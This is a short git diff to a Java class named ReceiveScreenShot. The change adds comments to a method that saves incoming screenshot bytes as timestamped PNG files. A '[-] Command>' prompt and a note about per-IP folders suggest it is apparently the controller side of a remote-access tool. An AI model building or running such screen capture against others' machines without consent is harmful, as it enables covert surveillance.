@@ -13,18 +13,19 @@ public class ReceiveScreenShot {
         saveScreenshot(imageBytes);
     }
 
+    //Save screenshot
     private void saveScreenshot(byte[] imageBytes) {
         try {
-            Path saveDir = Paths.get(SCREENSHOT_DIR);
+            Path saveDir = Paths.get(SCREENSHOT_DIR); //Literally makes a directory called screenshot, maybe I should have it just put it in the ip directory, or create the ip directory if it doesn't exist
             if (Files.notExists(saveDir)) {
                 Files.createDirectories(saveDir);
                 System.out.println("[INFO] Created directory for screenshots: " + saveDir.toAbsolutePath());
             }
 
-            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
-            Path screenshotFile = saveDir.resolve("screenshot_" + timestamp + ".png");
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date()); //Saves based on the time and date
+            Path screenshotFile = saveDir.resolve("screenshot_" + timestamp + ".png"); //Don't take too many too quickly or it will overwrite them, could implement a fix for that at somepoint
 
-            Files.write(screenshotFile, imageBytes);
+            Files.write(screenshotFile, imageBytes); //Write the bytes
             System.out.println("[INFO] Screenshot saved at: " + screenshotFile.toAbsolutePath());
             System.out.print("[-] Command> ");
         } catch (IOException ex) {
